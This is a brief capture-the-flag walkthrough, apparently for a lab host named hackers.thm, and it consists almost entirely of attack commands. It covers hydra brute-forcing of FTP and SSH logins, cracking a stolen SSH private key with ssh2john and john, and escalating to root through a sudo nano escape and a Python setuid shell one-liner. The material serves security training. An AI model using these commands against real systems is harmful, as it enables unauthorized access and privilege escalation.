# Hackers 
## Step 1
`ftp hackers.thm` anonymous login *optional*
### Gcrawford Path
		1. `hydra ftp://hackers.thm -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 64`
		2. `ftp hackers.thm` login with `gcrawford` and get `id_rsa` and `business.txt`
		3. `ssh2john.py id_rsa > ssh_hash.txt`
		4. `john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt`
			5. `ssh2john.py id_rsa > ssh_hash.txt && john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt`
		6. `ssh -i id_rsa -l gcrawford hackers.thm `
		7. `sudo nano`
		8. CTRL+R, CTRL+X
		9. `reset; sh 1>&0 2>&0`
### Rcampbell Path
	1. `hydra ssh://hackers.thm -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64` or `msfconsole` `use auxiliary/scanner/ssh/ssh_login`
	2. `getcap -r / 2>/dev/null` *optional*
	3. `python -c 'import os,pty; os.setuid(0);pty.spawn("/bin/bash")'`
